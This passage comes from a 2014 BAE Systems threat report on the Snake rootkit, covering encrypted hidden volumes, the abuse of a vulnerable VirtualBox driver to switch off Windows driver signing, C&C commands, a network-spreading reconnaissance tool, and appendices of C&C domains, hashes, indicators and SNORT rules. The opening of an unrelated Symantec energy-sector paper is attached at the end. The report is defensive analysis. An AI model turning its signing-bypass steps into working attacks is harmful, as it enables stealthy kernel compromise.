s volume by accessing the contents of this file (unless the encryption is broken, that is).
Enlisting the contents of the created volume is possible, along with creating files on it:
    C:\>echo Test > \\.\Hd1\Test.txt
    C:\>type \\.\Hd1\\Test.txt
    Test
    C:\>dir \\.\Hd1\\
      Volume in drive \\.\Hd1 has no label.
      Volume Serial Number is BA9B-99E8
      Directory of \\.\Hd1
    14/02/2014        02:22 PM                             7 Test.txt
                          1 File(s)                         7 bytes
                          0 Dir(s)                          0 bytes free
                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014             20
However, as soon as IofCallDriver() hook is removed, the same 
 command will fail, as with no hook the rootkit cannot
decrypt the scrambled volume:
    C:\>dir \\.\Hd1\\
    Incorrect function.
The second volume \\.\Hd2 is not mapped to a file, so when a computer is switched off, its contents is lost. Thus, it could be
used as a temporary or a cache storage. The data stored in \\.\Hd2 is encrypted the same way the first volume
s data.
Both volumes appear to be set up as FAT volumes.
An attempt to read the data from these volumes with the code below:
 01         HANDLE hDisk = CreateFile(
\\\\.\\Hd1
 02         
                       GENERIC_READ,
 03         
                       FILE_SHARE_READ,
 04         
                       NULL,
 05         
                       OPEN_EXISTING,
 06         
                       0,
 07         
                       NULL);
 08         BYTE lpBuffer[16384];
 09         DWORD dwBytes;
 10         if (hDisk)
 11         {
 12         
      ReadFile(hDisk, lpBuffer, 16384, &dwBytes, NULL);
 13         
      // inspect the buffer
 14         
CloseHandle(hDisk);
 15         }
This will produce the following results:
For \\.\Hd1:
                     0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F    0123456789ABCDEF
        00000000     EB   00   00   00   00   00   00   00   00   00   00   00   02   04   02   00   ................
        00000010     02   00   02   00   00   F8   C8   00   20   00   02   00   01   00   00   00   ........ .......
        00000020     FF   1F   03   00   80   00   29   E8   99   9B   BA   4E   4F   20   4E   41   ......)....NO NA
        00000030     4D   45   20   20   20   20   46   41   54   31   36   20   20   20   00   00   ME    FAT16   ..
        00000040     00   00   00   00   00   00   00   00   00   00   00   00   00   00   00   00   ................
For \\.\Hd2:
                     0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F    0123456789ABCDEF
        00000000     EB   00   00   00   00   00   00   00   00   00   00   00   02   01   02   00   ................
        00000010     02   00   02   FF   7F   F8   7F   00   20   00   02   00   01   00   00   00   ........ .......
        00000020     00   00   00   00   80   00   29   E8   99   9B   BA   4E   4F   20   4E   41   ......)....NO NA
        00000030     4D   45   20   20   20   20   46   41   54   31   36   20   20   20   00   00   ME    FAT16   ..
        00000040     00   00   00   00   00   00   00   00   00   00   00   00   00   00   00   00   ................
 The ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode
 DLL, as these volumes are accessible both from usermode and kernel mode.
 Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it.
 For example, it stores its message queue in a file called:
 \.\\Hd1\queue
 The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL,
 e.g. to pass commands, configuration parameters, binary images of additional Snake components.
 Other files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe,
 where rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command
 outputs, intercepted keystrokes, and other output logs.
                                                                       BAE Systems Applied Intelligence: Snake Rootkit Report 2014   21
64-BIT EDITIONS OF WINDOWS
The 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft
Windows, the most significant of which are kernel driver signature validation and Kernel Patch Protection (more commonly known as
PatchGuard).
PatchGuard is a feature of 64-bit Windows which aims to prevent modification of the Windows kernel, something that is often
performed by malware attempting to hide itself on an infected system. Although PatchGuard is successful at preventing kernel
patching once initialised, several published bypass approaches exist4,5. The technique used by Snake appears to be similar to these
approaches.
The driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel-mode drivers to be signed
with a valid digital signature. The Snake dropper contains both 32-bit and 64-bit unsigned drivers, and it can successfully load its
unsigned 64-bit driver on a 64-bit version of Windows XP 
 as driver signing is not enforced it does not have to resort to any tricks
under this OS version. In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit
driver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP.
On 64-bit versions of Windows Vista and above it behaves differently. Firstly, the 64-bit unsigned driver file is created as usual:
     %windows%\$NtUninstallQ817473$\fdisk.sys
However, the driver is not registered; what is registered instead is the dropper itself. To do that, the dropper first copies itself as:
     %windows%\$NtUninstallQ817473$\fdisk_mon.exe
The dropper then registers itself as a service to ensure it starts every time Windows is booted, by creating the values:
     ErrorControl = 0
     Type = 16
     Start = 2
     ImagePath = 
%SystemRoot%\$NtUninstallQ817473$\fdisk_mon.exe
     ObjectName = 
LocalSystem
     WOW64 = 1
in the registry key:
     HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Ultra3
Now comes the most interesting part: does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows
Vista and later versions, such as 64-bit Windows 7/8? The answer: Yes, it does.
Does it resort to using bootkit technology, which has been used in the past to bypass protections to load unsigned 64-bit drivers?
The answer: No. Bootkits must overwrite the Master Boot Record (MBR) and antivirus products are well trained to catch that kind of
bad behavior.
The masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability
in a well-known virtualization product called VirtualBox, a product made by Oracle which is widely used by researchers to analyse
malware. VirtualBox driver version 1.6.2 was released in June 2, 2008. Two months later, in August 2008, security researchers
reported that its main driver component, which is signed under the entity 
innotek Gmbh
, contained a privilege escalation
vulnerability6.
In a nutshell, the VirtualBox software installs a driver called VBoxDrv. The driver is controlled with the Input/Ouput Control Codes
(32-bit values called IOCTL) passed along DeviceIoControl() API. One of the documented transfer methods that the system
uses to pass data between the caller of DeviceIoControl() API and the driver itself is called METHOD_NEITHER.
As per MSDN documentation7, METHOD_NEITHER is a special transfer type when Input/Output Request Packet (IRP) supplies the
user-mode virtual addresses of the input and output buffers, without validating or mapping them.
          http://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3
http://uninformed.org/index.cgi?v=3&a=3&p=17
          http://www.coresecurity.com/content/virtualbox-privilege-escalation-vulnerability
          http://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx
                                                                  BAE Systems Applied Intelligence: Snake Rootkit Report 2014              22
It is the responsibility of the driver to validate the addresses sent from user mode in order to make sure those addresses are valid
usermode addresses.
The source code of the vulnerable driver (shown below) demonstrates how the integer value of the rc variable is first derived from
the input parameters pDevObj (device object) and pIrp (request packet). Next, that integer value is written into the UserBuffer - an
arbitrary address, pointed by the input parameter pIrp (request packet). As there are no validations made for the UserBuffer an
attacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with:
    01     /**
    02       * Device I/O Control entry point.
    03       *
    04       * @param   pDevObj     Device object.
    05       * @param   pIrp        Request packet.
    06       */
    07     NTSTATUS _stdcall VBoxDrvNtDeviceControl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
    08     {
    09         PSUPDRVDEVEXT       pDevExt = (PSUPDRVDEVEXT)pDevObj->DeviceExtension;
    10         PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);
    11         PSUPDRVSESSION      pSession = (PSUPDRVSESSION)pStack->FileObject->FsContext;
    12
    13         ULONG ulCmd = pStack->Parameters.DeviceIoControl.IoControlCode;
    14
    15         if ( ulCmd == SUP_IOCTL_FAST_DO_RAW_RUN
    16           || ulCmd == SUP_IOCTL_FAST_DO_HWACC_RUN
    17           || ulCmd == SUP_IOCTL_FAST_DO_NOP)
    18         {
    19            int rc;
    20     
         ...
    21            rc = supdrvIOCtlFast(ulCmd, pDevExt, pSession);
    22     
    23     
          //   supdrvIOCtlFast() function itself will return:
    24     
          //   pDevExt->pfnVMMR0EntryFast(pSession->pVM, SUP_VMMR0_DO_NOP);
    25     
          //   the function depends pDevExt and pSession, which in turn
    26     
          //   are derived from the input parameters pDevObj and pIrp
    27                //   therefore, rc value can be manipulated
    28             __try
    29             {
    30                                                           // save the manipulated rc value back into
    31                *(int *)pIrp->UserBuffer = rc;             // the input parameter (the address to patch)
    32             }
    33             __except(EXCEPTION_EXECUTE_HANDLER)
    34             {
    35                ...
    36             }
    37         }
    38     }
Now that the vulnerable driver can be used as a weapon to patch kernel memory, all the malware needs to do is to patch the content
of the variable nt!g_CiEnabled, a boolean variable 
Code Integrity Enabled
 that marks whether the system was booted in
WinPE mode.
When running in WinPE mode there is no Code Integrity control, therefore by enabling this mode by patching only one bit,
Code Integrity verification is disabled so that the unsigned 64-bit driver can be loaded.
This variable is used within the function SepInitializeCodeIntegrity(), implemented within CI.dll
s function
CiInitialize() and imported by the NT core (ntoskrnl.exe). In order to find the variable in kernel memory, the Snake
dropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll
s function CiInitialize(), and then
SepInitializeCodeIntegrity() within it. Then it parses the function
s code to locate the offset of the variable.
Once located, the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded.
This explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable
VBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and
finally, load the driver.
In order to be able to perform the steps above, the dropper must first obtain Administrator privileges. It attempts to do this by
running MS09-025 and MS10-015 exploits on the target system. These exploits are bundled within the dropper in its resource
section as executable files. Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver, a tool for
creating NTFS file systems, and the initial message queue file which is written into the virtual volume. The message queue file
contains configuration data and the libraries that will be injected into usermode processes.
                                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014            23
USERMODE DLLS
The usermode DLLs injected by the kernel-mode driver into the userland system process (e.g. explorer.exe) are:
     32-bit Windows OS:
           
 rkctl_Win32.dll
           
 inj_snake_Win32.dll
     64-bit Windows OS:
           
 rkctl_x64.dll
           
 inj_snake_x64.dll
The rkctl_Win32.dll/rkctl_x64.dll module uses the following hard-coded named pipe for communications:
\\.\pipe\services_control
The remote commands it receives appear to be designed to control other components of Snake:
     tc_cancel                                                 
    tc_free_data
     config_read_uint32                                        
    tc_get_reply
     tr_free                                                   
    tc_read_request_pipe
     tr_alloc                                                  
    tc_send_request_bufs
     tc_send_request                                           
    t_close
     tr_write_pipe                                             
    tc_socket
     snake_modules_command                                     
    snake_free
     t_setoptbin                                               
    snake_alloc
The inj_snake_Win32.dll/inj_snake_x64.dll module exports 61 functions. It is designed to perform the high-level tasks
such as:
     manage the configuration data (by using a queue)
     exfiltrate data by using Windows Internet (WinINet) APIs or Windows Sockets 2 (Winsock) APIs:
           
   communicate with the C&C server and receive commands to execute
           
   submit logs to the C&C server and other reports
When the DLL activates, it reads configuration parameters from the configuration queue, that the driver creates on a virtual volume.
One of the parameters defines the pipe name(s) that the DLL should use for its communications.
The remote commands received by this Snake DLL module are designed to set up various communication parameters:
     
    http_log                                                
    redir_str
     
    http_no_pragma_cache                                    
    http_max_opt
     
    http_no_accept                                          
    http_option
     
    proxy_useragent                                         
    http_uri
     
    proxy_bypass                                            
    no_server_hijack
     
    proxy_server                                            
    imp_level
     
    proxy_discover                                          
    net_password
     
    proxy_passwd                                            
    net_user
     
    proxy_user                                              
    write_peer_nfo
     
    check_inet                                              
    read_peer_nfo
To post the data, the DLL can use the following User-Agent string 
Mozilla/4.0 (compatible; MSIE 6.0)
It may rely on the following Internet Media types (MIME types) for data exfiltration:
     application/x-shockwave-flash                           
    image/gif
     image/pjpeg                                             
    application/msword
     image/jpeg                                              
    application/vnd.ms-excel
     image/x-xbitmap                                         
    application/vnd.ms-powerpoint
Request type it uses can either be POST of GET, and C&C server resource name is /default.asp.
                                                              BAE Systems Applied Intelligence: Snake Rootkit Report 2014        24
RECONNAISSANCE TOOL
One of the Snake components that could have been downloaded from a remote C&C server, was identified as a network
reconnaissance tool.
When run as a command line tool, with its logic defined with the command line switches, this tool enumerates other network hosts
and detects what Windows RPC services are enabled at the endpoints. It carries a list of interface identifiers associated with
the named pipes. It then uses these identifiers to write a message to and read a message from the associated named pipes. By
knowing what RPC services are running, it can successfully fingerprint all network hosts by mimicking the Metasploit
s logic of OS
fingerprinting via SMB. The fingerprinting allows it to reveal the following characteristics for each host found in the network:
   the version of the operating system
   version of the service pack
   the installed network services
The data it retrieves is encrypted and saved into a configuration file %system%\vtmon.bin. This file is then further encrypted with
an NTL-based (Number Theory Library) algorithm and is uploaded by the usermode-centric Snake rootkit to the C&C server, along
with other configuration files, such as mtmon.sdb, mtmon32.sdb, gstatsnd.bin, gstat.bin, gstat32.bin, and other log
files found in the %windows%\$NtUninstallQ[random]$ directory.
By using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim.
The attacker may then craft an exploit against those hosts, possibly by using the Metasploit framework, and then deliver the
generated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the
exp_os
 switch.
If the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking
control over new hosts, thus repeating the infection cycle all over again and spreading the infection further. Unlike traditional worm
techniques, this process is rather manual, but its danger is in the fact that the attacker can flexibly craft new attack methods,
adjusting them to the hosts present within the network, thus preying on the weakest (least updated, most vulnerable) victims along
its path.
                                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014            25
RELATIONSHIP TO AGENT.BTZ
As seen from the check-in logs found within one of the recent samples, the time span covers almost 6 years from January 2007 till
December 2012, which is aligned with the first reports of Agent.BTZ. It
s worth noting that Agent.BTZ used the same XOR key for its
logs as the most recent variants:
1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
Log files created by the latest samples of Snake, compiled in 2013 and 2014, were successfully decrypted with the same XOR key.
Other similarities include the usage of the virtual partition \\.\Vd1, the temporary file named FA.tmp, usage of files named
mswmpdat.tlb, wmcache.nld, winview.ocx.
CONCLUSION
The cyber-espionage operation behind the Snake rootkit is well established, a sample comiled in January 2006 indicates that
the activity would have begun in at least 2005. It is also sophisticated, using complex techniques for evading host defences and
providing the attackers covert communication channels. Toolmarks left behind by the authors 
vlad
gilg
, leave tantalizing clues
as to the personas behind this.
From a technical perspective, Snake demonstrates two very different approaches to the task of building a cyber-espionage toolkit.
One approach is to delegate the network communication engine to usermode code, backed up by a usermode rootkit. Another
approach is to carry out all of the communications from the kernel-mode driver, which is a very challenging task by itself.
The complexity of the usermode-centric approach is on par with Rustock rootkit - it uses similar techniques. It
s an old well-polished
technology that evolved over the years and demonstrated its resilience and survivability under the stress of security counter-
measures. The complexity of the kernel-centric architecture of Snake is quite unique. This architecture is designed to grant Snake
as much flexibility as possible. When most of the infected hosts are cut off from the outside world, it only needs one host to be
connected online. The traffic is then routed through that host to make external control and data exfiltration still possible.
The presence of the reconnaissance tool in the Snake operators
 framework suggests the existence of an arsenal of infiltration
tools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection
even further. As demonstrated, the backdoor commands allow Snake to provide remote attackers with full remote access to the
compromised system. Its ability to hibernate, staying fully inactive for a number of days, makes its detection during that time very
difficult.
The analysed code suggests that even file system and registry operations can be delegated by an infected module to another
module in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of
the browser processes so that the injected module could still write into files and into the sensitive registry hives.
The logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too. A great deal of attention has also
been given to keep its network communications as quiet as possible. Its ability to generate malicious traffic whenever the user
goes online and start loading the web pages allows it to 
blend in
 with the legitimate communications.
We expect much more will be uncovered by researchers in the coming weeks as the capabilities of this operation are further fleshed
out. However, as we implied in the opening section, we view this threat to be a permanent feature of the landscape. Whether they
dismantle this toolset and start from scratch, or continue using tools which have been exposed, remains to be seen. For their
targets though the considerable challenge of keeping secrets safe on sensitive networks will certainly continue for years to come.
RECOMMENDATIONS
   Search logs for connections to Snake
s command and control servers (see Appendix A)
   Search for MD5 hashes of the known samples (see Appendix B)
   Use Indicators of Compromise for building host-based rules (see Appendix C)
   Deploy SNORT rules for network based detection of Snake (see Appendix D)
                                                               BAE Systems Applied Intelligence: Snake Rootkit Report 2014         26
APPENDIX A
Domain                        IP Address       Country     Contact Email             Nameserver
arctic-zone.bbsindex.com      124.248.207.50   HK          abuse@directnic.com       NS1.DTDNS.COM
cars-online.zapto.org         124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
eunews-online.zapto.org       124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
fifa-rules.25u.com            124.248.207.50   HK          abuse@web.com             NS1.CHANGEIP.ORG
forum.sytes.net               124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
franceonline.sytes.net        124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
freeutils.3utilities.com      124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
health-everyday.faqserv.com   124.248.207.50   HK          abuse@web.com             NS1.CHANGEIP.ORG
nhl-blog.servegame.com        124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
olympik-blog.4dq.com          124.248.207.50   HK          abuse@web.com             NS1.CHANGEIP.ORG
pockerroom.servebeer.com      124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
pressforum.serveblog.net      124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
scandinavia-facts.sytes.net   124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
sportmusic.servemp3.com       124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
stockholm-blog.hopto.org      124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
supernews.sytes.net           124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
sweeden-history.zapto.org     124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
tiger.got-game.org            124.248.207.50   HK          abuse@web.com             NS1.CHANGEIP.ORG
top-facts.sytes.net           124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
weather-online.hopto.org      124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
wintersport.sytes.net         124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
x-files.zapto.org             124.248.207.50   HK          domains@no-ip.com         NF1.NO-IP.COM
forum.4dq.com                 203.117.122.51   SG          abuse@web.com             NS1.CHANGEIP.ORG
forum.acmetoy.com             203.117.122.51   SG          abuse@web.com             NS1.CHANGEIP.ORG
marketplace.servehttp.com     59.125.160.178   TW          domains@no-ip.com          NF1.NO-IP.COM
music-world.servemp3.com      80.152.223.171   DE          domains@no-ip.com          NF1.NO-IP.COM
newutils.3utilities.com       80.152.223.171   DE          domains@no-ip.com          NF1.NO-IP.COM
interesting-news.zapto.org    80.152.223.171   DE          domains@no-ip.com          NF1.NO-IP.COM
north-area.bbsindex.com                                    abuse@directnic.com        NS1.DTDNS.COM
academyawards.effers.com                                   abuse@directnic.com        NS1.DTDNS.COM
cheapflights.etowns.net                                    abuse@directnic.com        NS1.DTDNS.COM
toolsthem.xp3.biz                                          support@freewha.com        NS2.FREETZI.COM
softprog.freeoda.com                                       support@freewha.com        NS1.ORGFREE.COM
euassociate.6te.net                                        support@freewha.com        NS1.6TE.NET
euland.freevar.com                                         support@freewha.com        NS1.UEUO.COM
communityeu.xp3.biz                                        support@freewha.com        NS2.FREETZI.COM
swim.onlinewebshop.net                                     abuse@enom.com             NS1.RUNHOSTING.COM
july.mypressonline.com                                     abuse@enom.com             NS1.RUNHOSTING.COM
winter.site11.com                                          abuse@godaddy.com          NS1.000WEBHOST.COM
eu-sciffi.99k.org                                          report@abuse.zymic.com NF1.99K.ORG
                                                         BAE Systems Applied Intelligence: Snake Rootkit Report 2014   27
APPENDIX B
MD5 Hash                            File Type          FileSize Compile Time               Notes
Kernel-centric architecture
f4f192004df1a4723cb9a8b4a9eb2fbf    32-bit driver      206 KB      2011-06-24 07:49:41 fdisk.sys, Ultra3.sys
626576e5f0f85d77c460a322a92bb267 32-bit dropper 1,669 KB 2013-02-04 13:19:21 fdisk_mon.exe
90478f6ed92664e0a6e6a25ecfa8e395    64-bit driver      584 KB      2013-02-04 13:17:56 fdisk.sys, Ultra3.sys
1c6c857fa17ef0aa3373ff16084f2f1c    32-bit driver      219 KB      2013-02-04 13:20:00 fdisk.sys, Ultra3.sys
Usermode-centric architecture
973fce2d142e1323156ff1ad3735e50d    32-bit driver      673 KB      2013-08-29 07:34:54 msw32.sys,
                                                                                       cmbawt.sys
2eb233a759642abaae2e3b29b7c85b89 32-bit DLL            416 KB      2013-07-25 05:58:47 dropped DLL
Reconnaissance tool
c82c631bf739936810c0297d31b15519 32-bit exe            176 KB      2013-03-27 08:25:43 wextract.exe
Other analysed samples
f293c9640aa70b49f35627ef7fb58f15    32-bit exe         294 KB      2014-01-28 16:05:32 2014 sample
440802107441b03f09921138303ca9e9 32-bit driver         428 KB      2014-01-24 10:13:06 2014 sample
6406ad8833bafec59a32be842245c7dc    32-bit driver      277 KB      2013-03-29 07:51:34 Ultra3.sys,
                                                                                       Adaptec Windows Ultra3
                                                                                       Family Driver
c09fbf1f2150c1cc87c8f45bd788f91f    32-bit DLL         404 KB      2013-03-28 06:49:36 dropped DLL
                                                                                       mscpx32n.dll
5ce3455b85f2e8738a9aceb815b48aee    32-bit driver      280 KB      2013-03-29 07:44:26 Ultra3.sys,
                                                                                       Adaptec Windows Ultra3
                                                                                       Family Driver
b329095db961cf3b54d9acb48a3711da    32-bit DLL         412 Kb      2013-03-27 07:10:09 dropped DLL
                                                                                       kbdsmfno.dll
cfe0ef3d15f6a85cbd47e41340167e0b    32-bit dropper 363 KB          2012-12-18 08:22:47 mswint.exe,chset.exe
b86137fa5a232c614ec5405be4d13b37 32-bit DLL            223 KB      2012-12-18 08:22:43 libadcodec.dll
47f554745ef2a48baf3298a7aa2937e2    32-bit DLL         42 KB       2012-12-18 08:21:06 oleaut32.dll
ed785bbd156b61553aaf78b6f71fb37b
   64-bit driver      435 KB      2011-06-24 07:47:59 A0009548.sys
1c18c3ef8717bb973c5091ce0bbf6428    32-bit exe         179 KB      2011-06-21 12:28:28 MSWAUDIT.EXE, utility
                                                    BAE Systems Applied Intelligence: Snake Rootkit Report 2014   28
APPENDIX C
Location      Type            Data
Memory        Event
                              \BaseNamedObjects\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}
                              \BaseNamedObjects\shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}
                              \BaseNamedObjects\wininet_activate
Memory        Device
                                 \Device\RawDisk1
                                 \Device\RawDisk2
                                 \Device\vstor32
Memory        Antirootkit findings
                                 unknown pages with executable code, that can't be mapped to any driver
                                 presence of custom interrupt 0xC3 along with multiple hooks
                                 hidden drivers Ultra3, ~ROOT, hidden file fdisk.sys
File system   Volume
                                 \\.\Hd1
                                 \\.\Hd2
                                 \\.\vd1
Registry      Key
                                 HKLM\System\CurrentControlSer\Services\Ultra3
                                 HKLM\System\CurrentControlSer\Services\~ROOT
File system   File
                                 %windows%\$NtUninstallQ[random]$\mtmon.sdb
                                 %windows%\$NtUninstallQ[random]$\mtmon_.sdb
                                 %windows%\$NtUninstallQ[random]$\scmp.bin
                                 %windows%\$NtUninstallQ[random]$\ucmp.bin
                                 %windows%\$NtUninstallQ[random]$\isuninst.bin
                                 %windows%\$NtUninstallQ[random]$\mswmpdat.tlb
                                 %windows%\$NtUninstallQ[random]$\wmcache.nld
                                 %windows%\$NtUninstallQ[random]$\SPUNINST\Temp
                                 %system%\vtmon.bin
                                 %windows%\$NtUninstallQ817473$\hotfix.dat
                                 %windows%\$NtUninstallQ817473$\fdisk.sys
                                 %windows%\$NtUninstallQ817473$\fdisk_mon.exe
                                 %windows%\$NtUninstallQ817473$\rkng_inst.exe
Memory        Named Pipe
                                 \\.\Pipe\SP[COMPUTERNAME]
                                 \\.\Pipe\UP[COMPUTERNAME]
                                 \\.\Pipe\isapi_http
                                 \\.\Pipe\isapi_log
                                 \\.\Pipe\isapi_dg
                                 \\.\Pipe\services_control
                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014   29
APPENDIX D
Canditate SNORT rules:
alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:
Snake rootkit, usermode-centric encrypted command from
server
; content:
|01 00 00 00 00 00 00 00|1dM3uu4j7Fw4sjnb
; content:
HTTP/1.1 200 OK
; flow:to_client, established;
sid:1000010;)
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:
Snake rootkit, usermode-centric client request
; content:
/1/6b-
558694705129b01c0
; content:
Connection: Keep-Alive|0d 0a|
; flow:to_server,established; sid:1000011;)
                                                          BAE Systems Applied Intelligence: Snake Rootkit Report 2014   30
FOR MORE INFORMATION CONTACT:
BAE Systems Applied Intelligence
marketingai@baesystems.com
www.baesysytems.com/ai
AUSTRALIA                            UK                                    US
Level 6                              Surrey Research Park                  265 Franklin Street
62 Pitt St                           Guildford                             Boston
Sydney NSW 2000                      Surrey, GU2 7RQ                       MA 02110
Australia                            United Kingdom                        USA
T: +61 (0) 1300 027 001              T: +44 (0) 1483 816000                T: +1 (617) 737 4170
MALAYSIA                             DUBAI
Unit 2B-12-1                         Dubai Internet City
Jalan Stesen Sentral 5               Building 17
Kuala Lumpur Sentral                 Office Ground Floor 53
Kuala Lumpur, 50470                  PO Box 500523
T: +603 2780 2052                    Dubai
                                     T: +971 4369 4369
Copyright 
 BAE Systems 2014.
All rights reserved. BAE SYSTEMS, the BAE SYSTEMS Logo and the product names referenced herein are trademarks of BAE
Systems plc. BAE Systems Applied Intelligence Limited registered in England & Wales (No.1337451) with its registered office at
Surrey Research Park, Guildford, England, GU2 7RQ. No part of this document may be copied, reproduced, adapted or redistributed
in any form or by any means without the express prior written consent of BAE Systems Applied Intelligence.
SECURITY RESPONSE
Targeted Attacks Against
the Energy Sector
Candid Wueest
Version 1.0 
 January 13, 2014, 14:00 GMT
      The energy sector has become a major focus for targeted
      attacks and is now among the top five most targeted sectors
      worldwide.
    Follow us on Twitter                    Visit our Blog
    @threatintel                            http://www.symantec.com/connect/symantec-blogs/sr
CONTENTS
           OVERVIEW...................................................................... 3
           Introduction................................................................... 5
           Exposed systems: Online and offline............................. 7
           Smart grid: A new potential avenue of attack
           History of discovered attacks...................................... 10
               2013....................................................................... 10
               2008....................................................................... 10
               2003....................................................................... 10
               2001....................................................................... 10
               2000....................................................................... 10
               Stuxnet................................................................... 11
               Night Dragon.......................................................... 11
               Shamoon/Disttrack................................................ 12
           Spear phishing attacks in the energy sector
               New Year
s campaign............................................. 14
               Greek oil campaign................................................. 14
           Motivation and origin................................................... 16
           Protection and mitigation............................................ 16
           Conclusion.................................................................... 19
           Appendix...................................................................... 21
               A. Spear phishing .................................................. 21
               B. Visualization with TRIAGE.................................. 24
               C. Phases of targeted attacks................................ 25
           Resources..................................................................... 28
OVERVIEW
 The energy sector has become a major focus for targeted attacks and is now among the top
 five most targeted sectors worldwide. Companies in the sector are facing a growing risk
 of having their services interrupted or losing data. The threat to energy firms is only likely
 to increase in the coming years as new developments, such as further extensions of smart
 grids and smart metering expose more infrastructure to the Internet. Equipment that is
 not connected to the Internet and other networks is not immune to threats and there has
 already been a number of successful attacks against isolated systems. Operators of critical
 infrastructure, as well as energy utility companies, need to be aware of these threats and
 prepare accordingly.
 The threat to energy firms comes from several different sources. In some cases, espionage
 from competitors is the primary motive, with data on new projects, exploration and finances
 being targeted. Disruption and destruction are the goals of other attacks. Some instances
 appear to be state sponsored, such as the disruption of the Iranian nuclear program by
 the Stuxnet worm in 2010, one of the attacks that began this trend. Others appear to
 be the work of hacktivists with political or environmental agendas. Internal attackers,
 like disgruntled employees, are also a major source of attacks that often lead to service
 disruption. The majority of the actors behind these attacks have grown more sophisticated
 in the way they attack.
 During the monitoring period from July 2012 to June 2013, we observed an average of 74
 targeted attacks per day globally. Of these, nine attacks per day targeted the energy sector.
 Accounting for 16.3 percent of all attacks, the energy sector was the second most targeted
 vertical in the last six months of 2012, with only the government/public sector exceeding it
 with 25.4 percent of all attacks. The high ranking was mainly due to a major attack against
 a global oil company, which we observed in September 2012. However, in the first half of
 2013 the energy sector continued to attract a high proportion of attacks, ranking in fifth
 place with 7.6 percent of targeted attacks.
 Not all of the attacks analyzed used highly sophisticated tools. Most of them could have
 been prevented by following best practice guidelines for protecting the IT infrastructure and
 the industrial components, indicating that despite high revenues and strategic importance,
 many energy sector companies are not prioritizing cybersecurity.
INTRODUCTION
               Many power
               utilities companies
               fear disruptive
               attacks the most,
               regardless of
               whether it is done
               by internal or
               external attackers.
                                                                          Targeted Attacks Against the Energy Sector
Introduction
    The number of targeted cyberattacks in general has risen in the past few years. In addition to this, the rate of
    attack exposure has also risen, with more companies becoming aware of attacks, expecting them and searching
    for indications of compromise. It is not a new phenomenon, but its importance has grown. The Council on
    Foreign Relations, a US think tank, reported that energy companies, including oil and gas producers, were often
    the focus of targeted attacks during summer 2012. In May 2013 the US Department of Homeland Security
    (DHS) warned of an increase in sabotage attacks against US energy companies located in the Middle East. The
    government had tracked multiple attacks and issued a warning together with the Industrial Control Systems
    Cyber Emergency Response Team (ICS-CERT). A report by the US Congress supported this picture, stating that
    many power utilities companies were under constant or daily attack through cyberspace. Taking into account
    that successful breaches of critical infrastructures are still rare and that these numbers included generic
    malware infections, it nevertheless highlights the potential for cyberattacks in the energy sector.
    As in most sectors, attackers are often after valuable information. For example, we have seen attackers target
    intellectual property such as technology for photovoltaic research and wind turbines, or data on gas field
    exploration. Information such as this is of high value and can generate huge profits for attackers or their
    sponsors. The same information can also be misused for an act of sabotage. Many power utilities companies fear
    disruptive attacks the most, regardless of whether it is done by internal or external attackers. The energy sector
    has a high potential for critical disruption through sabotage attacks. Any interruption to the power grid would
    cause substantial chaos and cascading effects resulting in financial loss.
